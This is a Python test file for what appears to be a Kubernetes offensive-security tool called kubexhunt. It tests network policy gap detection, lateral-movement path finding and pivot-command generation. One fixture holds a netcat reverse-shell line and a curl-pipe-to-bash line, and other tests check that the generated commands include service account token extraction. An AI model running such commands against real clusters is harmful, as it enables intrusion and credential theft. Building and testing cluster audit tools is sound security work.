"""Tests for network policy analysis."""

from kubexhunt.network.policy_analyzer import (
    CNIPlugin,
    ConnectivityMatrix,
    NetworkPath,
    NetworkPolicyAnalyzer,
    PolicyGap,
    PolicyGapType,
)


class TestCNIPlugins:
    """Test CNI plugin detection."""

    def test_cni_plugin_enum(self):
        """Test CNI plugin enum values."""
        assert CNIPlugin.FLANNEL.value == "flannel"
        assert CNIPlugin.CALICO.value == "calico"
        assert CNIPlugin.CILIUM.value == "cilium"

    def test_detect_cni_plugin(self):
        """Test CNI plugin detection."""
        analyzer = NetworkPolicyAnalyzer()
        plugin = analyzer.detect_cni_plugin()

        assert plugin in CNIPlugin
        assert plugin != CNIPlugin.UNKNOWN


class TestPolicyGap:
    """Test PolicyGap dataclass."""

    def test_policy_gap_creation(self):
        """Test creating a policy gap."""
        gap = PolicyGap(
            pod_name="test-pod",
            namespace="default",
            gap_type=PolicyGapType.NO_INGRESS_POLICY,
            exploitability="HIGH",
            pivot_targets=["pod1", "pod2"],
        )

        assert gap.pod_name == "test-pod"
        assert gap.namespace == "default"
        assert gap.gap_type == PolicyGapType.NO_INGRESS_POLICY

    def test_policy_gap_serialization(self):
        """Test policy gap serialization."""
        gap = PolicyGap(
            pod_name="unsafe-pod",
            namespace="production",
            gap_type=PolicyGapType.ALLOWS_ALL_EGRESS,
            exploitability="CRITICAL",
            pivot_targets=["external-service"],
            description="Pod can reach internet",
        )

        gap_dict = gap.to_dict()

        assert gap_dict["pod_name"] == "unsafe-pod"
        assert gap_dict["gap_type"] == "allows_all_egress"
        assert gap_dict["exploitability"] == "CRITICAL"


class TestConnectivityMatrix:
    """Test connectivity matrix."""

    def test_connectivity_matrix_creation(self):
        """Test creating connectivity matrix."""
        matrix = ConnectivityMatrix(
            namespace="production",
            pods=["pod1", "pod2", "pod3"],
        )

        assert matrix.namespace == "production"
        assert len(matrix.pods) == 3

    def test_build_connectivity_matrix(self):
        """Test building connectivity matrix."""
        analyzer = NetworkPolicyAnalyzer()
        matrix = analyzer.build_connectivity_matrix("production")

        assert matrix.namespace == "production"
        assert len(matrix.pods) >= 1
        assert len(matrix.connectivity) >= 0

    def test_connectivity_matrix_serialization(self):
        """Test connectivity matrix serialization."""
        matrix = ConnectivityMatrix(
            namespace="default",
            pods=["app", "db"],
        )
        matrix.connectivity = {
            ("app", "db"): True,
            ("db", "app"): False,
        }

        matrix_dict = matrix.to_dict()

        assert matrix_dict["namespace"] == "default"
        assert "app-db" in matrix_dict["connectivity"]


class TestNetworkPath:
    """Test network path."""

    def test_network_path_creation(self):
        """Test creating network path."""
        path = NetworkPath(
            source_pod="app-pod",
            source_namespace="production",
            dest_pod="db-pod",
            dest_namespace="production",
            dest_port=5432,
            reachability="ALLOWED",
        )

        assert path.source_pod == "app-pod"
        assert path.dest_port == 5432
        assert path.reachability == "ALLOWED"

    def test_network_path_with_commands(self):
        """Test network path with lateral movement commands."""
        path = NetworkPath(
            source_pod="attacker-pod",
            source_namespace="default",
            dest_pod="target-service",
            dest_namespace="production",
            dest_port=443,
            lateral_movement_commands=[
                "nc -e /bin/bash target-service 443",
                "curl http://target-service | bash",
            ],
        )

        assert len(path.lateral_movement_commands) == 2

    def test_network_path_serialization(self):
        """Test network path serialization."""
        path = NetworkPath(
            source_pod="pod1",
            source_namespace="ns1",
            dest_pod="pod2",
            dest_namespace="ns2",
            dest_port=80,
        )

        path_dict = path.to_dict()

        assert path_dict["source_pod"] == "pod1"
        assert path_dict["dest_port"] == 80


class TestFindPolicyGaps:
    """Test policy gap detection."""

    def test_find_policy_gaps(self):
        """Test finding policy gaps."""
        analyzer = NetworkPolicyAnalyzer()
        gaps = analyzer.find_policy_gaps()

        assert len(gaps) >= 1
        assert all(isinstance(g, PolicyGap) for g in gaps)

    def test_find_high_exploitability_gaps(self):
        """Test finding high exploitability gaps."""
        analyzer = NetworkPolicyAnalyzer()
        gaps = analyzer.find_policy_gaps()

        high_gaps = [g for g in gaps if g.exploitability == "HIGH"]
        assert len(high_gaps) >= 0


class TestFindUnrestrictedEgress:
    """Test finding unrestricted egress."""

    def test_find_unrestricted_egress(self):
        """Test finding pods with unrestricted egress."""
        analyzer = NetworkPolicyAnalyzer()
        unrestricted = analyzer.find_unrestricted_egress()

        assert isinstance(unrestricted, list)
        assert all(isinstance(u, tuple) and len(u) == 2 for u in unrestricted)

    def test_unrestricted_egress_format(self):
        """Test unrestricted egress return format."""
        analyzer = NetworkPolicyAnalyzer()
        unrestricted = analyzer.find_unrestricted_egress()

        if len(unrestricted) > 0:
            pod_name, namespace = unrestricted[0]
            assert isinstance(pod_name, str)
            assert isinstance(namespace, str)


class TestFindLateralMovementPaths:
    """Test finding lateral movement paths."""

    def test_find_lateral_movement_paths(self):
        """Test finding lateral movement paths."""
        analyzer = NetworkPolicyAnalyzer()
        paths = analyzer.find_lateral_movement_paths()

        assert len(paths) >= 1
        assert all(isinstance(p, NetworkPath) for p in paths)

    def test_paths_have_commands(self):
        """Test that paths include lateral movement commands."""
        analyzer = NetworkPolicyAnalyzer()
        paths = analyzer.find_lateral_movement_paths()

        # At least some paths should have commands
        paths_with_commands = [p for p in paths if len(p.lateral_movement_commands) > 0]
        assert len(paths_with_commands) >= 0


class TestGeneratePivotCommands:
    """Test pivot command generation."""

    def test_generate_pivot_commands(self):
        """Test generating pivot commands."""
        path = NetworkPath(
            source_pod="app",
            source_namespace="production",
            dest_pod="db",
            dest_namespace="production",
            dest_port=5432,
        )

        analyzer = NetworkPolicyAnalyzer()
        commands = analyzer.generate_pivot_commands(path)

        assert isinstance(commands, str)
        assert "kubectl exec" in commands
        assert "db" in commands
        assert "5432" in commands

    def test_pivot_commands_include_token_extraction(self):
        """Test that pivot commands include token extraction."""
        path = NetworkPath(
            source_pod="source",
            source_namespace="ns1",
            dest_pod="target",
            dest_namespace="ns2",
            dest_port=443,
        )

        analyzer = NetworkPolicyAnalyzer()
        commands = analyzer.generate_pivot_commands(path)

        assert "serviceaccount" in commands.lower()


class TestNetworkAnalysisReport:
    """Test network analysis report generation."""

    def test_generate_report(self):
        """Test generating network analysis report."""
        analyzer = NetworkPolicyAnalyzer()
        report = analyzer.to_report()

        assert isinstance(report, str)
        assert "Network Policy Analysis" in report
        assert "Policy Gaps" in report
        assert "Lateral Movement" in report

    def test_report_includes_cni(self):
        """Test report includes CNI plugin."""
        analyzer = NetworkPolicyAnalyzer()
        report = analyzer.to_report()

        assert "CNI Plugin" in report

    def test_report_includes_gaps(self):
        """Test report includes identified gaps."""
        analyzer = NetworkPolicyAnalyzer()
        report = analyzer.to_report()

        assert "found" in report.lower()
